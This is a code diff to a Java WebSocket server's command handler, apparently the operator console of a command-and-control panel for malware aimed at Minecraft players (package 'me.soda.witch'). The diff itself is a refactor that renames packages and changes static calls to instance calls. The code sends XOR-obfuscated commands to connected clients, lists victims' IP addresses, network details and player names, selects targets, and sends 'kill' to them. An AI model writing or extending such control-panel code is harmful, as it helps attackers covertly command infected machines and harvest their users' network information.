@@ -1,7 +1,7 @@
-package me.soda.server.handlers;
+package me.soda.witch.server.handlers;
 
 import com.google.gson.JsonObject;
-import me.soda.server.Server;
+import me.soda.witch.server.Server;
 import org.java_websocket.WebSocket;
 
 import java.io.File;
@@ -16,7 +16,7 @@ public class CommandHandler {
     private static boolean all = true;
 
     private void tryBroadcast(String message, Server server) {
-        byte[] encrypted = Server.xor.encrypt(message);
+        byte[] encrypted = Server.defaultXOR.encrypt(message);
         if (all)
             server.broadcast(encrypted);
         else
@@ -36,11 +36,11 @@ public class CommandHandler {
                     }
                     case "conn" -> {
                         if (msgArr.length == 1) {
-                            Server.log("----CONNECTIONS----");
+                            server.log("----CONNECTIONS----");
                             server.getConnections().forEach(conn -> {
                                 int index = conn.<Integer>getAttachment();
-                                JsonObject jsonObject = Server.clientMap.get(conn);
-                                Server.log(String.format("IP: %s, ID: %s, Player:%s",
+                                JsonObject jsonObject = server.clientMap.get(conn);
+                                server.log(String.format("IP: %s, ID: %s, Player:%s",
                                         jsonObject.getAsJsonObject("ip").get("ip").getAsString(),
                                         index, jsonObject.get("playerName").getAsString()));
                             });
@@ -48,31 +48,31 @@ public class CommandHandler {
                             switch (msgArr[1]) {
                                 case "net" -> server.getConnections().stream().filter(conn ->
                                                 conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
-                                        .forEach(conn -> Server.log(String.format("ID: %s, Network info: %s ", msgArr[2],
-                                                Server.clientMap.get(conn).getAsJsonObject("ip").toString()
+                                        .forEach(conn -> server.log(String.format("ID: %s, Network info: %s ", msgArr[2],
+                                                server.clientMap.get(conn).getAsJsonObject("ip").toString()
                                         )));
                                 case "player" -> server.getConnections().stream().filter(conn ->
                                                 conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
-                                        .forEach(conn -> Server.log(String.format("ID: %s, Player info: %s ", msgArr[2],
-                                                Server.clientMap.get(conn).toString()
+                                        .forEach(conn -> server.log(String.format("ID: %s, Player info: %s ", msgArr[2],
+                                                server.clientMap.get(conn).toString()
                                         )));
                                 case "sel" -> {
                                     connCollection = new ArrayList<>();
                                     if (msgArr[2].equals("all")) {
                                         all = true;
-                                        Server.log("Selected all clients!");
+                                        server.log("Selected all clients!");
                                         break;
                                     }
                                     server.getConnections().stream().filter(conn ->
                                                     conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                             .forEach(conn -> connCollection.add(conn));
-                                    Server.log("Selected client!");
+                                    server.log("Selected client!");
                                 }
                                 case "disconnect" -> {
                                     server.getConnections().stream().filter(conn ->
                                                     conn.<Integer>getAttachment() == Integer.parseInt(msgArr[2]))
                                             .forEach(conn -> conn.send("kill"));
-                                    Server.log("Client " + msgArr[2] + " disconnected");
+                                    server.log("Client " + msgArr[2] + " disconnected");
                                 }
                                 default -> {
                                 }
